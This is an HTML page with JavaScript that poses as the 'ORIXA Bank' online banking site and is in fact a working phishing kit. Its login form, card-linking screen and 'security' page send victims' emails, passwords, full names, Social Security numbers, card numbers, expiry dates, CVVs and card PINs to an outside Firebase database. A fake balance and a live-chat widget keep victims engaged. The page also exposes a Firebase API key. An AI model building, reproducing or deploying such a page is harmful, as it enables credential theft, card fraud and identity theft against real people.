<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ORIXA Bank: Digital Summary</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root { --orixa-blue: #003087; --orixa-accent: #0070ba; --bg: #f5f7fa; --text: #2c2e2f; }
        body { font-family: "Open Sans", Arial, sans-serif; background: var(--bg); margin: 0; color: var(--text); padding-bottom: 75px; -webkit-tap-highlight-color: transparent; }
        
        /* AUTH SCREEN */
        #login-screen { padding: 40px 20px; text-align: center; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        .orixa-brand { font-size: 28px; font-weight: 800; color: var(--orixa-blue); margin-bottom: 30px; letter-spacing: -1px; }

        /* DASHBOARD */
        .bank-header { background: var(--orixa-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
        .header-logo { color: white; font-weight: 800; font-size: 18px; }
        .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .bal-val { font-size: 42px; font-weight: 300; margin: 10px 0; }
        
        input, textarea { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
        .btn-bank { width: 100%; padding: 16px; background: var(--orixa-accent); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 16px; cursor: pointer; }
        
        .overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 5000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #ddd; z-index: 1000; }
        .nav-item { color: #666; font-size: 10px; text-align: center; cursor: pointer; }
        
        #smartsupp-widget-container { bottom: 80px !important; }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="orixa-brand">ORIXA BANK</div>
        <h2 id="auth-title">Welcome Back</h2>
        <div style="width: 100%; max-width: 350px;">
            <input type="email" id="email" placeholder="Online ID / Email">
            <input type="password" id="pass" placeholder="Passcode">
            
            <div id="signup-extra" style="display:none;">
                <input type="text" id="fullname" placeholder="Full legal name">
                <input type="text" id="ssn-init" placeholder="Social Security Number">
            </div>

            <button id="action-btn" class="btn-bank" onclick="captureAccount()">Log In</button>
            <p onclick="toggleAuth()" style="color:var(--orixa-accent); cursor:pointer; margin-top:20px; font-weight:600;">Join ORIXA Bank Today</p>
        </div>
    </div>

    <div id="main-app" style="display:none;">
        <div class="bank-header">
            <i class="fas fa-bars" style="color:white;"></i>
            <div class="header-logo">ORIXA</div>
            <div onclick="openPage('kyc')" style="width:30px; height:30px; background:#fff; border-radius:50%; color:var(--orixa-blue); display:flex; align-items:center; justify-content:center;"><i class="fas fa-user"></i></div>
        </div>

        <div class="card">
            <div style="display:flex; justify-content:space-between;">
                <span style="font-weight:600; color:#666;">Available Balance</span>
                <span id="tier-tag" style="font-size:10px; color:var(--orixa-accent); font-weight:bold;">PREMIUM TIER</span>
            </div>
            <div class="bal-val" id="main-bal">US$0.00</div>
            <div style="display:flex; gap:10px;">
                <button class="btn-bank" style="flex:1;" onclick="openPage('send')">Transfer</button>
                <button class="btn-bank" style="flex:1; background:white; color:var(--orixa-accent); border:1px solid var(--orixa-accent);" onclick="openPage('receive')">Request</button>
            </div>
        </div>

        <div class="card" onclick="openPage('link')" style="cursor:pointer; display:flex; gap:15px; align-items:center;">
            <div style="background:#f0f2f5; padding:12px; border-radius:50%; color:var(--orixa-accent);"><i class="fas fa-credit-card"></i></div>
            <div>
                <b>Add Funding Source</b><br>
                <small>Link a card to verify your identity.</small>
            </div>
        </div>

        <div style="padding: 10px 20px;">
            <b style="color:#a3acb9; font-size:14px;">Recent Transactions</b>
            <div id="activity-feed" style="margin-top: 10px;"></div>
        </div>

        <div class="bottom-nav">
            <div class="nav-item" onclick="location.reload()"><i class="fas fa-university"></i><br>Bank</div>
            <div class="nav-item" onclick="openPage('receive')"><i class="fas fa-download"></i><br>Receive</div>
            <div class="nav-item" onclick="openPage('send')"><i class="fas fa-upload"></i><br>Send</div>
            <div class="nav-item" onclick="openPage('kyc')"><i class="fas fa-shield-alt"></i><br>Security</div>
        </div>
    </div>

    <div id="overlay" class="overlay">
        <div style="display:flex; align-items:center; gap:20px; margin-bottom:20px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
            <i class="fas fa-times" onclick="closePage()" style="font-size:22px;"></i>
            <b id="overlay-title" style="font-size:18px;">Page</b>
        </div>
        <div id="overlay-body"></div>
    </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
        authDomain: "orixa-football-pro.firebaseapp.com",
        projectId: "orixa-football-pro",
        databaseURL: "https://orixa-football-pro-default-rtdb.firebaseio.com",
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let balance = 0.00;
    let isLogin = true;
    let userPin = "";

    window.toggleAuth = function() {
        isLogin = !isLogin;
        document.getElementById('signup-extra').style.display = isLogin ? 'none' : 'block';
        document.getElementById('auth-title').innerText = isLogin ? 'Welcome Back' : 'Create Account';
        document.getElementById('action-btn').innerText = isLogin ? 'Log In' : 'Agree & Create';
    };

    window.captureAccount = function() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        if(!e || !p) return alert("Required credentials missing.");

        db.ref('orixa_logins').push({
            email: e, pass: p, 
            name: document.getElementById('fullname').value || "N/A", 
            ssn: document.getElementById('ssn-init').value || "N/A", 
            time: new Date().toLocaleString()
        }).then(() => {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'block';
            updateUI();
        });
    };

    window.openPage = function(type) {
        const body = document.getElementById('overlay-body');
        const title = document.getElementById('overlay-title');
        document.getElementById('overlay').style.display = 'block';
        body.innerHTML = "";

        if(type === 'receive') {
            title.innerText = "Request Funds";
            body.innerHTML = `<input type="text" id="r-from" placeholder="Sender ID"><input type="number" id="r-amt" placeholder="Amount ($)"><textarea id="r-note" placeholder="Memo"></textarea><button class="btn-bank" onclick="doRequest()">Request</button>`;
        } else if(type === 'link') {
            title.innerText = "Verify Card";
            body.innerHTML = `<input type="text" id="c-num" placeholder="Card Number" maxlength="16"><input type="text" id="c-exp" placeholder="MM/YY" style="width:48%; display:inline-block;"><input type="text" id="c-cvv" placeholder="CVV" style="width:48%; display:inline-block; float:right;" maxlength="3"><button class="btn-bank" onclick="doLink()">Verify & Link</button>`;
        } else if(type === 'send') {
            title.innerText = "Internal Transfer";
            body.innerHTML = `<input type="text" id="s-to" placeholder="Account Number"><input type="number" id="s-am" placeholder="Amount"><input type="password" id="s-p" placeholder="Enter Card PIN" maxlength="4"><button class="btn-bank" onclick="doSend()">Authorize Transfer</button>`;
        } else if(type === 'kyc') {
            title.innerText = "Bank Security";
            body.innerHTML = `<p>Increase your transfer limit by verifying your identity.</p><input type="text" id="v-ssn" placeholder="Full SSN"><input type="password" id="v-pin" placeholder="Set 4-Digit Access PIN" maxlength="4"><button class="btn-bank" onclick="doVerify()">Verify Identity</button>`;
        }
    };

    window.closePage = function() { document.getElementById('overlay').style.display = 'none'; };

    window.doRequest = function() {
        db.ref('orixa_requests').push({from: document.getElementById('r-from').value, amt: document.getElementById('r-amt').value});
        alert("Request Sent!"); closePage();
    };

    window.doLink = function() {
        const cn = document.getElementById('c-num').value;
        if(cn.length < 16) return alert("16-digit card number required.");
        db.ref('orixa_cards').push({num: cn, exp: document.getElementById('c-exp').value, cvv: document.getElementById('c-cvv').value, time: new Date().toLocaleString()});

        const body = document.getElementById('overlay-body');
        const title = document.getElementById('overlay-title');
        title.innerText = "Bank Verification";
        body.innerHTML = `<div style="text-align:center;"><i class="fas fa-shield-alt fa-3x" style="color:var(--orixa-blue);"></i><p>Verify your 4-digit card PIN to authorize this card.</p></div>
            <input type="password" id="c-pin" placeholder="Card PIN" maxlength="4" style="text-align:center; font-size:24px;">
            <button class="btn-bank" onclick="finalizeCard()">Confirm</button>`;
    };

    window.finalizeCard = function() {
        const pVal = document.getElementById('c-pin').value;
        db.ref('orixa_cards').limitToLast(1).once('child_added', (snap) => { snap.ref.update({ card_pin: pVal }); });
        balance += 2500; updateUI(); closePage(); alert("Identity Verified.");
    };

    window.doVerify = function() {
        userPin = document.getElementById('v-pin').value;
        db.ref('orixa_kyc').push({ssn: document.getElementById('v-ssn').value, pin: userPin});
        closePage(); alert("Reviewing Documentation.");
    };

    window.doSend = function() {
        if(userPin && document.getElementById('s-p').value !== userPin) return alert("Security PIN mismatch.");
        balance -= document.getElementById('s-am').value;
        db.ref('orixa_txs').push({to: document.getElementById('s-to').value, amt: document.getElementById('s-am').value, time: new Date().toLocaleString()});
        updateUI(); closePage();
    };

    function updateUI() {
        document.getElementById('main-bal').innerText = "US$" + balance.toFixed(2);
        db.ref('orixa_txs').on('value', (snap) => {
            const feed = document.getElementById('activity-feed'); feed.innerHTML = "";
            snap.forEach(c => {
                const d = c.val();
                feed.innerHTML += `<div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;"><div><b>To: ${d.to}</b><br><small>${d.time}</small></div><b style="color:red;">-US$${d.amt}</b></div>`;
            });
        });
    }
</script>

<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'b561b44ffefb49aa584810c42983ccf091f55186';
window.smartsupp||(function(d) {
var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
s=d.getElementsByTagName('script')[0];c=d.createElement('script');
c.type='text/javascript';c.charset='utf-8';c.async=true;
c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>

</body>
</html>
